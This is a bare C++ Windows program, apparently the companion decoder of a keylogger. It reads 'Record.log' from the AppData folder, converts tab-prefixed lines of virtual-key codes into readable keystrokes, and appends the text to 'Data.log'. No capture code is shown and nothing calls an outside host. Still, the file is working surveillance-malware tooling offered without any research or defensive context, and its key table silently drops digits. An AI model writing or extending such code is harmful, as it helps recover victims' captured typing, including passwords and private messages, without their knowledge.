#include <fstream>
#include <string>
#include <vector>
#include <sstream>
#include <cstdlib>
#include <shlobj.h>
#include <windows.h>
#pragma comment(lib, "shell32.lib")

std::string DecodeKey(int code) {
    switch(code) {
        case 8: return "[BACKSPACE]";
        case 9: return "[TAB]";
        case 13: return "\n";
        case 32: return " ";
        // Letters A-Z
        case 65: return "A"; case 66: return "B"; case 67: return "C"; case 68: return "D";
        case 69: return "E"; case 70: return "F"; case 71: return "G"; case 72: return "H";
        case 73: return "I"; case 74: return "J"; case 75: return "K"; case 76: return "L";
        case 77: return "M"; case 78: return "N"; case 79: return "O"; case 80: return "P";
        case 81: return "Q"; case 82: return "R"; case 83: return "S"; case 84: return "T";
        case 85: return "U"; case 86: return "V"; case 87: return "W"; case 88: return "X";
        case 89: return "Y"; case 90: return "Z";
        // Function keys
        case 112: return "[F1]"; case 113: return "[F2]"; case 114: return "[F3]";
        case 115: return "[F4]"; case 116: return "[F5]"; case 117: return "[F6]";
        case 118: return "[F7]"; case 119: return "[F8]"; case 120: return "[F9]";
        case 121: return "[F10]"; case 122: return "[F11]"; case 123: return "[F12]";
        // Special characters
        case 186: return ";"; case 187: return "="; case 188: return ",";
        case 189: return "-"; case 190: return "."; case 191: return "/";
        case 192: return "`"; case 219: return "["; case 220: return "\\";
        case 221: return "]"; case 222: return "'";
        default: return "";
    }
}

int main() {
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    
    std::string inputPath = std::string(appDataPath) + "\\Record.log";
    std::string outputPath = std::string(appDataPath) + "\\Data.log";
    
    // Append terminator to log file
    std::ofstream appendFile(inputPath.c_str(), std::ios::app);
    if (appendFile) appendFile << "0";
    appendFile.close();

    std::ifstream inputFile(inputPath.c_str());
    std::ofstream outputFile(outputPath.c_str(), std::ios::app);
    
    if (!inputFile || !outputFile) {
        return 1;
    }

    std::string line;
    while (std::getline(inputFile, line)) {
        if (!line.empty() && line[0] == '\t') {
            outputFile << ">>\n";
            std::istringstream iss(line.substr(1));
            
            int keyCode;
            while (iss >> keyCode && keyCode != 0) {
                outputFile << DecodeKey(keyCode);
            }
        } else if (!line.empty()) {
            outputFile << line << "\n";
        }
    }

    inputFile.close();
    outputFile.close();
    
    return 0;
}